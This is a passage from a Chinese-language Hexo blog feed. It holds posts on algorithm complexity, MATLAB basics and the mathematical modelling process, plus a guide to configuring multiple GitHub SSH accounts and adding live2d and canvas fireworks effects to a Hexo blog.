算法的复杂度通常分为时间复杂度，空间复杂度，采用<strong>“大O表示法”</strong>定义算法效率度量。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 判定算法性能的一个基本考虑是处理一定<strong>“规模（Size）”</strong>的输入时，该算法所需执行的<strong>“基本操作数（Basic Operation）”。</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))是指保证函数T(N)以不快于f(N)速度增长；f(N)是一个上界（upper bound），即某个算法的增长率最差情况是f(N)，给出几个例子：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.算法时间复杂度为 O(1),称为常量阶</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.算法时间复杂度为 O(n),称为线性阶</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.算法时间复杂度为 O(n*n),称为平方阶</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.算法时间复杂度为 O(log2n),称为对数阶</span><span class="token comment" spellcheck="true">//根据基本执行次数，运用极限的方法来计算复杂度</span></code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 一个程序的空间复杂度是指从程序运行到结束所需的存储量。而程序的存储空间分为固定部分和可变部分，就像电脑分了硬盘存储空间和内存存储空间一样😄，程序本身所占的物理空间加上程序运行时所需要的内存组成了程序运行所需的存储空间。</p><p>Try to get the best answer！</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day2-–-matlab-基本用法"><a href="#数学建模-day2-–-matlab-基本用法" class="headerlink" title="数学建模_day2 – matlab 基本用法"></a>数学建模_day2 – matlab 基本用法</h1><p><img src="https://i.loli.net/2018/10/07/5bb957ec92262.png" alt=""><br>&nbsp; &nbsp; &nbsp; &nbsp; matlab 整体界面如上图，在matlab中一般需要创建变量，调用函数，定义变量和 python 类似，<strong>如果没有定义输出变量，matlab则会使用一个名为ans的变量存储计算结果。</strong></p><p> &nbsp; &nbsp; &nbsp; matlab主要被用来对整个矩阵或者数组进行操作。</p><h3 id="一-那么如何来进行数组的创建呢："><a href="#一-那么如何来进行数组的创建呢：" class="headerlink" title="一. 那么如何来进行数组的创建呢："></a>一. 那么如何来进行数组的创建呢：</h3><ul><li><p>随便创建一个一维数组 a= [1 2 3 4],也可称作单行矩阵或行向量</p><p><img src="https://i.loli.net/2018/10/07/5bb959beb45e8.png" alt=""></p></li><li><p>创建多行矩阵则用分号分开</p><p><img src="https://i.loli.net/2018/10/07/5bb95a474bb84.png" alt=""></p></li></ul><h3 id="二-用函数对矩阵和数组进行一些操作："><a href="#二-用函数对矩阵和数组进行一些操作：" class="headerlink" title="二. 用函数对矩阵和数组进行一些操作："></a>二. 用函数对矩阵和数组进行一些操作：</h3><ul><li><p>sin,cos,tan,cot等函数都能使用:</p><p><img src="https://i.loli.net/2018/10/07/5bb95b8054e4c.png" alt=""></p></li><li><p>矩阵的加减乘除以及转置（共轭转置为 b’ ,非共轭转置为运算 b.’对于实数没有区别) ,人性化的报错😄好评：</p><p><img src="https://i.loli.net/2018/10/07/5bb95c2d99dcf.png" alt=""></p></li><li><p>矩阵求逆运算 inv 函数：</p><p><img src="https://i.loli.net/2018/10/07/5bb95d8d1797d.png" alt=""></p></li><li><p>格式化输出 format short(long)：</p><p><img src="https://i.loli.net/2018/10/07/5bb95e3e30a1b.png" alt=""></p></li><li><p>矩阵每一个元素的平方（s.*s)，立方(s.^3)操作：</p><p><img src="https://i.loli.net/2018/10/07/5bb95ed30a03c.png" alt=""></p></li><li><p>矩阵的扩充操作：</p><p><img src="https://i.loli.net/2018/10/07/5bb95f5d5a4e8.png" alt=""></p><h3 id="三-工作空间变量"><a href="#三-工作空间变量" class="headerlink" title="三. 工作空间变量"></a>三. 工作空间变量</h3></li><li><p>magic 和 rand ，以及whos命令</p><p>magic是一种用于产生魔方矩阵的函数，产生的矩阵的每行、列以及对角线的数之和相等。该和的值为1+2+3+…..+n^2的和再除以n，n必须为大于或等于3的整数。 </p><p>rand函数则用于产生由在(0, 1)之间均匀分布的随机数组成的数组 ，如rand（4）则是产生一个1行4列的数组，rand（2，3）则是2行3列矩阵，rand（2，3，4）则是四个2行3列的矩阵</p><p><img src="https://i.loli.net/2018/10/07/5bb961e66a53f.png" alt=""></p></li><li><p>save，load，clear 命令。save用于保存数据到 mat文件中，load用于加载mat文件，clear则是清除当前工作区变量。</p><p><img src="https://i.loli.net/2018/10/07/5bb9628c75d19.png" alt=""></p></li></ul><h3 id="四-字符和字符串操作"><a href="#四-字符和字符串操作" class="headerlink" title="四. 字符和字符串操作"></a>四. 字符和字符串操作</h3><ul><li><p>定义字符和字符串：</p><p><img src="https://i.loli.net/2018/10/07/5bb963f2ec434.png" alt=""></p></li><li><p>数字转字符，字符拼接（int2str or num2str函数）：</p><p><img src="https://i.loli.net/2018/10/07/5bb965001606c.png" alt=""></p><h3 id="五-调用函数"><a href="#五-调用函数" class="headerlink" title="五. 调用函数"></a>五. 调用函数</h3></li><li><p>matlab 和大多数编程语言一样，提供了很多函数来简化代码提高效率，例如常见的 min，max函数，且函数同样具有返回值类型，个数等条件:</p><p><img src="https://i.loli.net/2018/10/07/5bb9674e3f44e.png" alt=""></p></li><li><p>zeros，ones 函数，生成特定矩阵（全零或者全一）：</p><p><img src="https://i.loli.net/2018/10/07/5bb967c6a83a3.png" alt=""></p></li><li><p>size，sum函数，size用于计算大小，如矩阵的行列数，sum则用于求和，两者传参有相似之处：</p><p><img src="https://i.loli.net/2018/10/07/5bb968c8cee9a.png" alt=""></p></li></ul><p>  <img src="https://i.loli.net/2018/10/07/5bb9687d4ff42.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模_day1</title>
      <link href="/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/"/>
      <url>/2018/10/06/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day1/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day1–初入数模"><a href="#数学建模-day1–初入数模" class="headerlink" title="数学建模_day1–初入数模"></a>数学建模_day1–初入数模</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为一个大二刚开始的学生才真正接触数模，虽然有点晚了，但我相信有付出，就有回报，没有付出就没有馅饼😄。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模是什么东西呢？简单来说就是通过数学的符号和语言作表述来建立数学模型，而此数学模型首先是根据实际问题建立的，通过这个建立的数学模型，我们可以去解决一个实际的问题，如共享单车，城市排污等等问题。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学建模的过程包括表述，求解，解释，检验四个过程。可细分为七个步骤：模型准备，模型假设，模型构成，模型求解，模型分析，模型检验，模型应用。</p><h3 id="1-模型准备"><a href="#1-模型准备" class="headerlink" title="1.模型准备"></a>1.模型准备</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 作为建模的第一步，我们首先应该了解给出的那个问题的实际背景，再明确建模的目的，从而可以针对性地搜集有关的信息，掌握模型对象的特征之后，在我们脑海中形成一个比较清晰的问题。比如共享单车的投放问题，面对这个问题我们首先就知道了需要得出一个合理的投放量，那么我们就需要从多方面来获取信息，如各地人口数量，交通情况，以及基础设施完善程度等等信息，来丰富这个模型的特征，进而建立出合理的模型来解决共享单车的投放问题。<br><img src="https://i.loli.net/2018/10/06/5bb8d2dd91a08.png" alt=""></p><h3 id="2-模型假设"><a href="#2-模型假设" class="headerlink" title="2.模型假设"></a>2.模型假设</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 在模型假设这一步中，很明显你建立出来的模型是否合理取决于它的可用性，针对问题的特点和建模目的，要做出最合理的模型假设，怎么个合理法呢？那就是要符合实际情况，如物质成本，时间成本，空间成本等等条件。<br><img src="https://i.loli.net/2018/10/06/5bb8d3068e279.png" alt=""></p><h3 id="3-模型构成"><a href="#3-模型构成" class="headerlink" title="3.模型构成"></a>3.模型构成</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 模型的构成就需要我们好好讲究了，正所谓讲究而不将就，如何在实际情况与构成难度之间做出最合适的表达也是一门艺术。这一步我们需要尽量采用简单普遍的数学工具来构成模型。<br><img src="https://i.loli.net/2018/10/06/5bb8d31f817e6.png" alt=""></p><h3 id="4-模型求解"><a href="#4-模型求解" class="headerlink" title="4.模型求解"></a>4.模型求解</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过各种数学方法，软件（matlab，mathematical，lingo），以及计算机编程技术，来对模型进行高效率地求解。</p><h3 id="5-模型分析"><a href="#5-模型分析" class="headerlink" title="5.模型分析"></a>5.模型分析</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 对求出来的结果进行误差分析，统计分析，以及模型对数据的稳定性分析（机器学习也有涉及：1. 计算的稳定性(Computational Stability)；2. 数据稳定性；3. 性能的稳定性 [参考链接]: <a href="https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）" target="_blank" rel="noopener">https://blog.csdn.net/zhouwenyuan1015/article/details/78228818）</a></p><h3 id="6-模型检验"><a href="#6-模型检验" class="headerlink" title="6.模型检验"></a>6.模型检验</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数学讲究一个严谨，因而在模型求解之后进行检验那是必然的。我们需要将解出来的数据与实际现象，现实数据比较，从而检验模型的合理性。</p><h3 id="7-模型应用"><a href="#7-模型应用" class="headerlink" title="7.模型应用"></a>7.模型应用</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 当模型能够得到应用时，说明这是个成熟的模型了，该学会自己解决问题了（脑补 成熟的模型.jpg😄)。</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>多Git账户以及Hexo搭建博客进阶</title>
      <link href="/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"/>
      <url>/2018/10/06/%E5%A4%9AGit%E8%B4%A6%E6%88%B7%E4%BB%A5%E5%8F%8AHexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="多Git账户以及Hexo搭建博客进阶"><a href="#多Git账户以及Hexo搭建博客进阶" class="headerlink" title="多Git账户以及Hexo搭建博客进阶"></a>多Git账户以及Hexo搭建博客进阶</h1><h2 id="1-生成密钥"><a href="#1-生成密钥" class="headerlink" title="1.生成密钥"></a>1.生成密钥</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb631dc309a8.png" alt=""></p><p>可以看到已经生成的id_rsa是0LinkSec git账户的密钥</p><p>而yof3ng的则是我准备搭建的第二个hexo的密钥</p></blockquote><h2 id="2-配置config文件"><a href="#2-配置config文件" class="headerlink" title="2.配置config文件"></a>2.配置config文件</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#userName1(yof3ng@gmail.com)0LinkSec Lab</span>Host 0LinkSecHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token comment" spellcheck="true">#userName2 yof3ng@qq.com</span>Host yof3ngHostName github<span class="token punctuation">.</span>comPreferredAuthentications publickeyIdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>yof3ng</code></pre><p>需要注意的是缩进问题，缩进可能会产生报错。</p><p>在github上添加完ssh密钥之后即可进行下一步</p></blockquote><h2 id="3-git连接测试"><a href="#3-git连接测试" class="headerlink" title="3.git连接测试"></a>3.git连接测试</h2><blockquote><p>第一个账户git@0LinkSec：</p><p><img src="https://i.loli.net/2018/10/04/5bb632d0def6c.png" alt=""></p><p>第二个账户git@yof3ng：</p><p><img src="https://i.loli.net/2018/10/04/5bb632ecc2c9c.png" alt=""></p><p>两个账户已经建立成功，接下来即可进行第二个hexo的搭建。</p></blockquote><h2 id="4-第二个hexo初始化后配置-config文件"><a href="#4-第二个hexo初始化后配置-config文件" class="headerlink" title="4.第二个hexo初始化后配置 config文件"></a>4.第二个hexo初始化后配置 config文件</h2><blockquote><p><img src="https://i.loli.net/2018/10/04/5bb6376eaf144.png" alt=""></p><p>​    强调repository项：应该设置为前面设置的第二用户,若为<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>则会默认为第一用户，连接0LinkSec。</p><p>到此第二hexo搭建成功。</p></blockquote><h2 id="5-souce目录下CNAME文件建立，以及域名CNAME记录建立"><a href="#5-souce目录下CNAME文件建立，以及域名CNAME记录建立" class="headerlink" title="5.souce目录下CNAME文件建立，以及域名CNAME记录建立"></a>5.souce目录下CNAME文件建立，以及域名CNAME记录建立</h2><blockquote><p>在域名解析处新建yof3ng二级域名CNAME记录，指向 yof3ng.github.io,以及在hexo根目录下的source文件夹建立CNAME文件，将yof3ng.0Link.top填入其中即可。</p><p><img src="https://i.loli.net/2018/10/05/5bb76525ca26d.png" alt=""></p></blockquote><h2 id="6-开启强制https服务选项"><a href="#6-开启强制https服务选项" class="headerlink" title="6.开启强制https服务选项"></a>6.开启强制https服务选项</h2><p>在github 对应仓库中的setting中设置即可。</p><h2 id="7-添加萌宠精灵"><a href="#7-添加萌宠精灵" class="headerlink" title="7.添加萌宠精灵"></a>7.添加萌宠精灵</h2><blockquote><p><a href="https://blog.csdn.net/Aoman_Hao/article/details/82049821" target="_blank" rel="noopener">参考</a>链接</p><p>切换到博客目录然后输入：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#安装live2d</span>npm install <span class="token operator">-</span><span class="token operator">-</span>save hexo<span class="token operator">-</span>helper<span class="token operator">-</span>live2d<span class="token comment" spellcheck="true">#安装萌宠module</span>npm install live2d<span class="token operator">-</span>widget<span class="token operator">-</span>model<span class="token operator">-</span>koharu </code></pre><p>添加在config文件内：</p><pre class=" language-shell"><code class="language-shell">live2d:  enable: true  scriptFrom: local  model:    use: live2d-widget-model-koharu  display:    position: right    width: 140    height: 260  mobile:    show: true</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb847f7047c9.png" alt=""></p></blockquote><h2 id="8-添加鼠标点击特效"><a href="#8-添加鼠标点击特效" class="headerlink" title="8.添加鼠标点击特效"></a>8.添加鼠标点击特效</h2><blockquote><p>添加鼠标点击爆炸效果：<br>在主题的js目录下创建fireworks.js并写入如下代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token 